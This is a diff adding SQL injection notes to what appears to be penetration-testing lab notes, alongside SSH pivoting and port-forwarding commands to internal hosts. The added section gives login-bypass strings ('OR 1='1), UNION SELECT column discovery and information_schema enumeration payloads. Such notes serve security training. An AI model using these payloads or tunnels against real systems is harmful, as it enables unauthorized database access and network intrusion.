@@ -58,11 +58,70 @@ lin-ops$ ssh -MS /tmp/t1  <t1 user>@127.0.0.1 -p <target local port>
 -O cancel -D9050 (cancel jump proxychains)
 
 8. Tepeat and Go DEEPER!!!
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+WEB NOTES:
 
 
 
 
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+SQL NOTES:
+
+Login fields:
+Input truth statements into both username and password boxes:
+
+        Username:  'OR 1='1
+
+        Password:  'OR 1='1
+
+        Go to inspect > Network > Post > Request > Raw (radio button)
+
+        x.x.x.x/login.php?username='OR 1='1&password='OR 1='1
+
+Post Method (text box):
+1. Identify vulnerable field
+
+        <Different options>'OR 1='1
+
+        You are looking for whichever option returns everything
+
+2. Identify the number of columns and order (**MOST IMPORTANT STEP**)
+
+        <Step 1 option>'Union select 1,2,3,4 #
+
+        add # or -- tells the database to ignore everything after (like a comment)
+
+3. Input golden statement
+
+        <Step 1 option>' Union SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns #
+
+        <Step 1 option> Union select column,column,column from schema.table #
+
+        !!!YOU WILL NOT BUILD WITH DEFAULT DATABASES!!! information_schema, performance_schema, MySQL
+
+        Duplicate tab!
+
+4. Craft queries with golden statement
+
+        Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
+
+        Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
+
+        Audi' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #
+
+Get Method (URL):
+Step 1: Identify vulnerable field
+
+        .php?Selection=
+
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ssh -S /tmp/jump jump -O forward -D9050 -L41100:192.168.28.100:80 -L41101:192.168.28.100:2222 -L41102:192.168.28.105:2222 -L41103:192.168.28.111:80 -L41104:192.168.28.111:2222
 -L 41105:192.168.28.111:8080 -L41106:192.168.28.120:4242 -L41107:192.168.150.245:3389 -L41108:192.168.150.253:80
 
